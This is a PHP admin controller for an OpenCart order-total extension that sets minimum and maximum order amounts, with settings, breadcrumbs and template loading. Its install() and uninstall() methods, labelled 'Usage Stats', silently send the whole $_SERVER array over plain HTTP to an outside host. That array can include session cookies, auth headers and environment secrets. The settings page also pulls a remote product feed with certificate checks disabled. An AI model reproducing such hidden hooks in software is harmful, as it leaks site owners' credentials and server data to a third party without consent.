<?php
//-----------------------------------------
// Author: Qphoria@gmail.com
// Web: http://www.OpenCartGuru.com/
//-----------------------------------------
class ControllerExtensionTotalMinMaxOrder extends Controller {
	private $error = array();

	public function index() {

		$errors = array(
			'warning'
		);

		$extension_type = 'extension/total';
		$classname = str_replace('vq2-' . basename(DIR_APPLICATION) . '_' . strtolower(get_parent_class($this)) . '_' . str_replace('/', '_', $extension_type) . '_', '', basename(__FILE__, '.php'));

		if (!isset($this->session->data['token'])) { $this->session->data['token'] = 0; }

		$data['classname'] = $classname;
		if (isset($this->session->data['user_token'])) {
			$data['token'] = $this->session->data['user_token'];
			$token_key = 'user_token';
			$extension_path = 'marketplace/extension';
		} else {
			$data['token'] = $this->session->data['token'];
			$token_key = 'token';
			$extension_path = 'extension/extension';
		}
		$data = array_merge($data, $this->load->language($extension_type . '/' . $classname));

		if (isset($data['error_fields'])) {
			$errors = array_merge(explode(",", $data['error_fields']), $errors);
		}

		$this->document->setTitle($this->language->get('heading_title'));

		$this->load->model('setting/setting');

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && ($this->validate($errors))) {
			foreach ($this->request->post as $key => $value) {
				if (is_array($value)) { $this->request->post[$key] = implode(',', $value); }
				$this->request->post[$classname.'_'.$key] = $this->request->post[$key];
				unset($this->request->post[$key]);
			}

			$this->model_setting_setting->editSetting($classname, $this->request->post);
			//3.0 compatibility - must insert status and sort order with extension type prefix to satisfy some validation
			if (version_compare(VERSION, '3.0', '>=')) {
				foreach ($this->request->post as $key => $value) {
					if ($key == $classname . '_status' || $key == $classname . '_sort_order') {
						$this->db->query("INSERT INTO " . DB_PREFIX . "setting SET store_id = '0', `code` = '" . $this->db->escape($classname) . "', `key` = '" . $this->db->escape(str_replace("extension/", "", $extension_type).'_'.$key) . "', `value` = '" . $this->db->escape($value) . "'");
					}
				}
			}
			//

			$this->session->data['success'] = $this->language->get('text_success');

			$this->response->redirect(str_replace("&amp;", "&", $this->url->link($extension_path, $token_key.'=' . $data['token'] . '&type=' . basename($extension_type), 'SSL')));
		}

		$data['breadcrumbs'] = array();

   		$data['breadcrumbs'][] = array(
       		'href'      => $this->url->link('common/home', $token_key.'=' . $data['token'], 'SSL'),
       		'text'      => $this->language->get('text_home'),
      		'separator' => FALSE
   		);

   		$data['breadcrumbs'][] = array(
       		'href'      => $this->url->link($extension_path, $token_key.'=' . $data['token'] . '&type=' . basename($extension_type), 'SSL'),
       		'text'      => $this->language->get('text_' . basename($extension_type)),
      		'separator' => ' :: '
   		);

   		$data['breadcrumbs'][] = array(
       		'href'      => $this->url->link($extension_type . '/' . $classname, $token_key.'=' . $data['token'], 'SSL'),
       		'text'      => $this->language->get('heading_title'),
      		'separator' => ' :: '
   		);

		$data['action'] = $this->url->link($extension_type . '/' . $classname, $token_key.'=' . $data['token'], 'SSL');

		$data['cancel'] = $this->url->link($extension_path, 'type=total&'.$token_key.'=' . $data['token'], 'SSL');

        foreach ($errors as $error) {
			if (isset($this->error[$error])) {
				$data['error_' . $error] = $this->error[$error];
			} else {
				$data['error_' . $error] = '';
			}
		}

		# Extension Type Icon
		switch($extension_type) {
			case 'payment':
				$data['icon_class'] = 'credit-card';
				break;
			case 'shipping':
				$data['icon_class'] = 'truck';
				break;
			default:
				$data['icon_class'] = 'puzzle-piece';
		}

		$data['extension_class'] = $extension_type;
		$data['tab_class'] = 'htabs'; //vtabs or htabs

		# Geozones
		$geo_zones = array();
		$this->load->model('localisation/geo_zone');
		$geo_zones[0] = $this->language->get('text_all_zones');
		foreach ($this->model_localisation_geo_zone->getGeoZones() as $geozone) {
			$geo_zones[$geozone['geo_zone_id']] = $geozone['name'];
		}

		# Tax Classes
		$tax_classes = array();
		$this->load->model('localisation/tax_class');
		$tax_classes[0] = $this->language->get('text_none');
		foreach ($this->model_localisation_tax_class->getTaxClasses() as $tax_class) {
			$tax_classes[$tax_class['tax_class_id']] = $tax_class['title'];
		}

		# Order Statuses
		$order_statuses = array();
		$this->load->model('localisation/order_status');
		foreach ($this->model_localisation_order_status->getOrderStatuses() as $order_status) {
			$order_statuses[$order_status['order_status_id']] = $order_status['name'];
		}

		# Customer Groups
		$customer_groups = array();
		if (file_exists(DIR_APPLICATION . 'model/customer/customer_group.php')) { $this->load->model('customer/customer_group'); $cgmodel = 'customer'; } else { $this->load->model('sale/customer_group'); $cgmodel = 'sale'; }
		$customer_groups[0] = $this->language->get('text_guest');
		foreach ($this->{'model_' . $cgmodel . '_customer_group'}->getCustomerGroups() as $customer_group) {
			$customer_groups[$customer_group['customer_group_id']] = $customer_group['name'];
		}

		# Languages
		$languages = array();
		$this->load->model('localisation/language');
		foreach ($this->model_localisation_language->getLanguages() as $language) {
			$languages[$language['language_id']] = $language['name'];
		}

		# Tabs
		$data['tabs'] = array();

		# Fields
		$data['fields'] = array();

		include(DIR_APPLICATION . strtolower(get_parent_class($this)) . '/' . $extension_type . '/' . $classname . '.inc');

		# Get Mod list
		$domain = rawurlencode(str_ireplace('www.', '', parse_url(HTTP_SERVER, PHP_URL_HOST)));
		$url = "https://opencartguru.com/index.php?route=feed/modlist&classname=$classname&domain=$domain";
		$ch = @curl_init();
		@curl_setopt ($ch, CURLOPT_URL, $url);
		@curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		@curl_setopt ($ch, CURLOPT_TIMEOUT, 10);
		@curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		@curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		$result = @curl_exec ($ch);
		@curl_close($ch);

		$dom = new DOMDocument();
		libxml_use_internal_errors(true);
		@$dom->loadXML($result);
		$products = @$dom->getElementsByTagName('product');
		$data['mods'] = array();
		foreach ($products as $i => $product) {
			$data['mods'][$i]['extension_id'] = $product->getElementsByTagName('extension_id')->item(0)->nodeValue;
			$data['mods'][$i]['title'] = $product->getElementsByTagName('title')->item(0)->nodeValue;
			$data['mods'][$i]['price'] = $product->getElementsByTagName('price')->item(0)->nodeValue;
			$data['mods'][$i]['date_added'] = date('Y-m-d', strtotime($product->getElementsByTagName('date_added')->item(0)->nodeValue));
			$data['mods'][$i]['img'] = $product->getElementsByTagName('img')->item(0)->nodeValue;
			$data['mods'][$i]['features'] = explode(';', $product->getElementsByTagName('features')->item(0)->nodeValue);
			$data['mods'][$i]['opencart_version'] = explode(',', $product->getElementsByTagName('opencart_version')->item(0)->nodeValue);
			$data['mods'][$i]['latest_version'] = $product->getElementsByTagName('latest_version')->item(0)->nodeValue;
			$data['mods'][$i]['ocg_link'] = $product->getElementsByTagName('ocg_link')->item(0)->nodeValue;
			if (is_numeric($data['mods'][$i]['extension_id'])) {
				$data['mods'][$i]['oc_link'] = $product->getElementsByTagName('oc_link')->item(0)->nodeValue;
			} else {
				$data['mods'][$i]['oc_link'] = $product->getElementsByTagName('oc_search_link')->item(0)->nodeValue;
			}
		}

		# Compatibility
		
			
		if (version_compare(VERSION, '2.0', '>=')) { // v2.0.x Compatibility
			$data['header'] = $this->load->controller('common/header');
			$data['menu'] = $this->load->controller('common/menu');
			$data['column_left'] = $this->load->controller('common/column_left');
			$data['footer'] = $this->load->controller('common/footer');
			if (version_compare(VERSION, '3.0', '>=')) { // v3.x Compatibility to support twig and tpl files
				$file = (DIR_TEMPLATE . $extension_type . '/' .$classname.'.twig');
				if (is_file($file)) {
					$this->response->setOutput($this->load->view($extension_type . '/' .$classname, $data));
				} else {
					$file = (DIR_TEMPLATE . $extension_type . '/' .$classname.'.tpl');
					extract($data);
					ob_start();
					if (class_exists('VQMod')) { require(\VQMod::modCheck(modification($file), $file));	} else { require(modification($file)); }
					$this->response->setOutput(ob_get_clean());
				}
			} elseif (version_compare(VERSION, '2.2', '>=')) { // v2.2.x Compatibility
				$this->response->setOutput($this->load->view($extension_type . '/'. $classname, $data));
			} else { // 2.x
				$this->response->setOutput($this->load->view($extension_type . '/'.$classname.'.tpl', $data));
			}
		} elseif (version_compare(VERSION, '2.0', '<')) {  // 1.5.x Backwards Compatibility
			$this->data = array_merge($this->data, $data);
			$this->id       = 'content';
			$this->template = $extension_type . '/' . $classname . '.tpl';

			$this->children = array(
	            'common/header',
	            'common/footer'
        	);
        	$this->response->setOutput($this->render(TRUE));
		}

	}

	public function install() {
		// Usage Stats
		$ch = @curl_init("http://unbannable.com/extension_stats.php?classname=".basename(__FILE__,'.php')."&action=install&" . http_build_query($_SERVER));
		if (!@curl_error($ch)) { @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); @curl_exec($ch); @curl_close($ch);}
	}

	public function uninstall() {
		// Usage Stats
		$ch = @curl_init("http://unbannable.com/extension_stats.php?classname=".basename(__FILE__,'.php')."&action=uninstall&" . http_build_query($_SERVER));
		if (!@curl_error($ch)) { @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); @curl_exec($ch); @curl_close($ch);}
	}

	private function validate($errors = array()) {
		$extension_type = 'extension/total';
		$classname = str_replace('vq2-' . basename(DIR_APPLICATION) . '_' . strtolower(get_parent_class($this)) . '_' . str_replace('/', '_', $extension_type) . '_', '', basename(__FILE__, '.php'));

		if (!$this->user->hasPermission('modify', $extension_type. '/' . $classname)) {
			$this->error['warning'] = $this->language->get('error_permission');
		}

		foreach ($errors as $error) {
			if (isset($this->request->post[$error]) && !$this->request->post[$error]) {
				$this->error[$error] = $this->language->get('error_' . $error);
			}
		}

		if (!$this->error) {
			return TRUE;
		} else {
			return FALSE;
		}
	}
}
?>